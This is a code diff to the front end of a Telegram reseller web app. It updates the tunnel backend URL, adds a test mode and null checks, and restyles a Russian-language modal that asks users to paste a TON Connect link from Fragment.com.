@@ -8,7 +8,7 @@ const MANIFEST_URL = "https://klochkonazar2014-prog.github.io/tg-reseller-webapp
 
 // 🚀 Dynamic Backend Detection
 const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
-const BACKEND_URL = "https://medal-motherboard-coalition-decimal.trycloudflare.com"; // Cloudflare Tunnel URL
+const BACKEND_URL = "https://mayor-occurrence-vancouver-valuable.trycloudflare.com"; // Cloudflare Tunnel URL
 console.log("Using backend:", BACKEND_URL);
 
 let tonConnectUI;
@@ -936,7 +936,8 @@ function closeTcModal() {
 async function submitTcLink() {
     const orderId = document.getElementById('tc-current-order-id').value;
     const link = document.getElementById('tc-link-input').value.trim();
-    const btn = document.querySelector('#tc-modal .btn-yellow');
+    const btn = document.querySelector('#tc-modal .tc-btn-premium') || document.querySelector('#tc-modal .btn-yellow');
+    if (!btn) return;
     const originalText = btn.innerText;
 
     if (!link.startsWith('tc://')) {
@@ -950,6 +951,13 @@ async function submitTcLink() {
     console.log("SubmitTC: OrderID=" + orderId + ", Link=" + link);
     if (!orderId) {
         alert("Ошибка: ID заказа не найден. Перезагрузите страницу.");
+        btn.innerText = originalText;
+        btn.disabled = false;
+        return;
+    }
+
+    if (orderId === 'TEST_ID') {
+        tg.showAlert("Это тестовый режим. В реальном приложении ссылка была бы отправлена на сервер.");
         btn.innerText = originalText;
         btn.disabled = false;
         return;
@@ -2450,25 +2458,48 @@ function openTcModal(orderId, isPolling = false) {
     document.getElementById('tc-modal').classList.add('active');
 
     const body = document.getElementById('tc-modal-body');
+    if (!body) return;
+
     if (isPolling) {
         body.innerHTML = `
-    <div id="tc-polling-state" style="text-align:center; padding: 20px 0;">
-        <div class="premium-spinner" style="margin: 0 auto 20px;"></div>
-        <p style="color:#fff; font-weight:700; margin-bottom:10px;">Ждем подтверждения оплаты...</p>
-        <p>Обычно это занимает 15-40 секунд. Не закрывайте это окно.</p>
-    </div>
-`;
+            <div class="tc-polling-premium">
+                <div class="premium-spinner" style="width: 60px; height: 60px; margin-bottom: 24px;"></div>
+                <div class="tc-polling-title">Ждем подтверждения...</div>
+                <div class="tc-polling-desc">
+                    Обычно это занимает 15-40 секунд.<br>
+                    Пожалуйста, не закрывайте это окно.
+                </div>
+            </div>
+        `;
     } else {
-        // Reset to default
         body.innerHTML = `
-    <p>1. Зайдите на Fragment.com (с компьютера или другого браузера).</p>
-    <p>2. Нажмите <b>Connect TON</b>.</p>
-    <p>3. Скопируйте ссылку <b>TON Connect Link</b> (кнопка рядом с QR-кодом).</p>
-    <p>4. Вставьте её сюда:</p>
-    <input type="text" id="tc-link-input" placeholder="tc://..."
-        style="width: 100%; height: 50px; background: rgba(255,255,255,0.05); border: 1px solid #333; border-radius: 12px; margin-top: 15px; color: #fff; padding: 0 15px;">
-    <button onclick="submitTcLink()" class="btn-yellow" style="width: 100%; margin-top: 20px;">Подключить кошелек</button>
-`;
+            <div class="tc-step" style="animation: fadeInUp 0.4s ease forwards; opacity:0;">
+                <div class="tc-step-number">1</div>
+                <div class="tc-step-text">Зайдите на <b>Fragment.com</b> в браузере вашего компьютера или телефона.</div>
+            </div>
+            <div class="tc-step" style="animation: fadeInUp 0.4s ease forwards 0.1s; opacity:0;">
+                <div class="tc-step-number">2</div>
+                <div class="tc-step-text">Нажмите <b>Connect TON</b> и перейдите в раздел управления кошельком.</div>
+            </div>
+            <div class="tc-step" style="animation: fadeInUp 0.4s ease forwards 0.2s; opacity:0;">
+                <div class="tc-step-number">3</div>
+                <div class="tc-step-text">Скопируйте <b>TON Connect Link</b> (кнопка рядом с QR-кодом).</div>
+            </div>
+            
+            <div class="tc-input-wrapper" style="animation: fadeInUp 0.4s ease forwards 0.3s; opacity:0;">
+                <div class="tc-input-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                        <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+                        <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+                    </svg>
+                </div>
+                <input type="text" id="tc-link-input" class="tc-input-premium" placeholder="Вставьте tc:// ссылку...">
+            </div>
+
+            <button onclick="submitTcLink()" class="tc-btn-premium" style="animation: fadeInUp 0.4s ease forwards 0.4s; opacity:0;">
+                Подключить кошелек
+            </button>
+        `;
     }
 }
 const trigger = document.getElementById('loader-trigger');
